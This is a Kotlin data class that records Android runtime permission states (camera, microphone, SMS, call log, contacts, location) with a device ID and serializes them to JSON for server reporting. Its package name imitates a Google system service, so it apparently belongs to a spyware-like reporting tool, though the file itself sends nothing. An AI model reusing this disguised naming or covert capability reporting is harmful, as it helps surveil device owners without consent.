package com.google.android.systemservice.utils

import com.google.gson.Gson
import com.google.gson.annotations.SerializedName

/**
 * Data class representing the current state of all runtime permissions.
 * Serializable to JSON for server reporting.
 */
data class PermissionStatus(
    @SerializedName("device_id")
    val deviceId: String,

    @SerializedName("android_version")
    val androidVersion: Int,

    @SerializedName("permissions")
    val permissions: Map<String, PermissionState>,

    @SerializedName("timestamp")
    val timestamp: Long = System.currentTimeMillis()
) {
    /**
     * State of an individual permission.
     */
    data class PermissionState(
        @SerializedName("granted")
        val granted: Boolean,

        @SerializedName("should_show_rationale")
        val shouldShowRationale: Boolean = false,

        @SerializedName("permanently_denied")
        val permanentlyDenied: Boolean = false
    )

    // Feature availability derived from permission state

    val isCameraAvailable: Boolean
        get() = isGranted(android.Manifest.permission.CAMERA)

    val isMicrophoneAvailable: Boolean
        get() = isGranted(android.Manifest.permission.RECORD_AUDIO)

    val isLocationAvailable: Boolean
        get() = isGranted(android.Manifest.permission.ACCESS_FINE_LOCATION) ||
                isGranted(android.Manifest.permission.ACCESS_COARSE_LOCATION)

    val isContactsAvailable: Boolean
        get() = isGranted(android.Manifest.permission.READ_CONTACTS)

    val isSmsAvailable: Boolean
        get() = isGranted(android.Manifest.permission.READ_SMS)

    val isCallLogAvailable: Boolean
        get() = isGranted(android.Manifest.permission.READ_CALL_LOG)

    val isStorageAvailable: Boolean
        get() = if (androidVersion >= 33) {
            isGranted("android.permission.READ_MEDIA_IMAGES") ||
            isGranted("android.permission.READ_MEDIA_VIDEO") ||
            isGranted("android.permission.READ_MEDIA_AUDIO")
        } else {
            isGranted(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }

    val isPhoneStateAvailable: Boolean
        get() = isGranted(android.Manifest.permission.READ_PHONE_STATE)

    fun isGranted(permission: String): Boolean {
        return permissions[permission]?.granted == true
    }

    /**
     * Returns a list of features and their availability.
     */
    fun availableFeatures(): Map<String, Boolean> = mapOf(
        "camera" to isCameraAvailable,
        "microphone" to isMicrophoneAvailable,
        "location" to isLocationAvailable,
        "contacts" to isContactsAvailable,
        "sms" to isSmsAvailable,
        "call_log" to isCallLogAvailable,
        "storage" to isStorageAvailable,
        "phone_state" to isPhoneStateAvailable
    )

    /**
     * Serialize to JSON for server reporting.
     */
    fun toJson(): String = Gson().toJson(this)

    companion object {
        fun fromJson(json: String): PermissionStatus = Gson().fromJson(json, PermissionStatus::class.java)
    }
}
